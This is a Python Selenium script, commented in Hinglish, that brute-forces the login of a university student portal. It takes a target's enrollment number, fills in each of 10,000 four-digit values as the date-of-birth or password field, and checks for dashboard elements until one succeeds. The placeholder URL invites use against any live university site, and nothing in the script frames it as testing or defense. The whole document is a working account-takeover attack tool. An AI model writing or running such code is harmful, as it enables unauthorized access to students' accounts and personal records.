import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

#1


portal_url = "koi see uni ya koi si site  live web ka link dalo yhan /StudentPanel"

demo_dobs = [f"{s:04d}" for s in range(10000)]

def get_next_dob():
   
    if demo_dobs:
        return demo_dobs.pop(0)
    return None

#1


enrollment_no = input("Apna Enrollment Number ya email daalein: ").strip()
dob = input("start krne ke liyo koi bhi nmber dale  daalein: ").strip()

options = webdriver.ChromeOptions()
options.add_argument("--start-maximized")
driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)

def check_login_status(driver, timeout=2.0):
    
    start_time = time.time()
    while time.time() - start_time < timeout:
       
        try:
            alert = driver.switch_to.alert
            alert_text = alert.text
            alert.accept()
            return False, alert_text
        except Exception:
            pass

       
        error_selectors = [
            "//span[contains(@id, 'lblMsg') or contains(@id, 'lblError') or contains(@id, 'Error')]",
            "//div[contains(@class, 'alert-danger') or contains(@class, 'toast-error') or contains(@class, 'sweet-alert') or contains(@class, 'swal2-html-container')]"
        ]
        for sel in error_selectors:
            try:
                for el in driver.find_elements(By.XPATH, sel):
                    if el.is_displayed() and el.text.strip():
                        return False, el.text.strip()
            except Exception:
                pass

      
        curr_url = driver.current_url.lower()
        if any(k in curr_url for k in ["dashboard", "home", "default", "studentdetail", "main"]):
            return True, "Dashboard URL detected"

        dashboard_selectors = [
            "//a[contains(@class, 'user-profile') or contains(@class, 'dropdown-toggle')]",
            "//a[contains(@href, 'Logout') or contains(@href, 'logout')]",
            "//a[contains(@href, 'Profile') or contains(@href, 'StudentDetail')]",
            "//i[contains(@class, 'fa-sign-out') or contains(@class, 'fa-power-off')]"
        ]
        for sel in dashboard_selectors:
            try:
                if any(e.is_displayed() for e in driver.find_elements(By.XPATH, sel)):
                    return True, "Dashboard elements visible"
            except Exception:
                pass

       
        try:
            inputs = driver.find_elements(
                By.XPATH, "//input[contains(@id, 'txtEnrollment') or contains(@placeholder, 'Enrollment')]"
            )
            if not any(i.is_displayed() for i in inputs):
                return True, "Login form submitted"
        except Exception:
            pass

        time.sleep(0.08)

    return False, "Login abhi nahi hua"

try:
    print(f"\nWebsite open ho rahi hai: {portal_url}")
    driver.get(portal_url)
    wait = WebDriverWait(driver, 10)
    time.sleep(1)

#2


    try:
        student_btn = driver.find_element(
            By.XPATH,
            "//input[@type='radio' and contains(@value, 'Student')] | //label[contains(text(), 'Student')] | //a[translate(normalize-space(text()), 'STUDENT', 'student')='student'] | //button[translate(normalize-space(text()), 'STUDENT', 'student')='student']"
        )
        driver.execute_script("arguments[0].click();", student_btn)
    except Exception:
        pass
#2


   
    enroll_input = wait.until(EC.visibility_of_element_located((
        By.XPATH, "//input[contains(@id, 'txtEnrollment') or contains(@placeholder, 'Enrollment') or @type='text'][1]"
    )))
    enroll_input.clear()
    enroll_input.send_keys(enrollment_no)

   
    dob_field = None
    dob_selectors = [
        "//input[contains(@id, 'txtDOB') or contains(@id, 'txtDob') or contains(@id, 'txtBirth') or contains(@id, 'txtPassword') or contains(@placeholder, 'DOB') or contains(@placeholder, 'Birth') or @type='password']",
        "//input[contains(@id, 'Password') or contains(@id, 'txtPassword')]"
    ]
    for sel in dob_selectors:
        try:
            for el in driver.find_elements(By.XPATH, sel):
                if el.is_displayed() and el.is_enabled():
                    dob_field = el
                    break
            if dob_field:
                break
        except Exception:
            pass

    if not dob_field:
        enroll_input.click()
        enroll_input.send_keys(Keys.TAB)
        dob_field = driver.switch_to.active_element

    login_btn_selectors = [
        "//input[contains(@id, 'btnSubmit') or contains(@id, 'btnLogin')]",
        "//button[contains(@id, 'btnSubmit') or contains(@id, 'btnLogin')]",
        "//input[@type='submit' and contains(@value, 'Login')]",
        "//button[contains(text(), 'Login') or contains(text(), 'Sign In')]",
        "//input[@type='submit']"
    ]
    login_btn = None
    for b_sel in login_btn_selectors:
        try:
            for b in driver.find_elements(By.XPATH, b_sel):
                if b.is_displayed():
                    login_btn = b
                    break
            if login_btn:
                break
        except Exception:
            pass

   
    while True:
       
        try:
            dob_field.send_keys(Keys.COMMAND + "a")
            dob_field.send_keys(Keys.CONTROL + "a")
            dob_field.send_keys(Keys.BACKSPACE)
            dob_field.send_keys(dob)
        except Exception:
           
            enroll_input = wait.until(EC.visibility_of_element_located((
                By.XPATH, "//input[contains(@id, 'txtEnrollment') or contains(@placeholder, 'Enrollment') or @type='text'][1]"
            )))
            if enroll_input.get_attribute("value").strip() != enrollment_no:
                enroll_input.clear()
                enroll_input.send_keys(enrollment_no)
            enroll_input.click()
            enroll_input.send_keys(Keys.TAB)
            dob_field = driver.switch_to.active_element
            dob_field.send_keys(Keys.CONTROL + "a", Keys.BACKSPACE)
            dob_field.send_keys(dob)

      
        try:
            driver.execute_script("arguments[0].click();", login_btn)
        except Exception:
            dob_field.send_keys(Keys.ENTER)

       
        is_success, msg = check_login_status(driver)
        if is_success:
            print("\n" + "=" * 50)
            print(f"🎉 SUCCESS! Sahi DOB mila ({dob}), Login ho gaya!")
            print("=" * 50)
            break
        else:
            print(f"❌ Galat DOB: {dob}")
            RETRY_DOB = get_next_dob()
            if not RETRY_DOB:
                print("Khatam: get_next_dob() ne koi DOB nahi diya.")
                break
            dob = str(RETRY_DOB).strip()

except Exception as e:
    print(f"\nError: {e}")

finally:
    print("\nBrowser band karne ke liye Enter dabayein...")
    input()
    driver.quit()
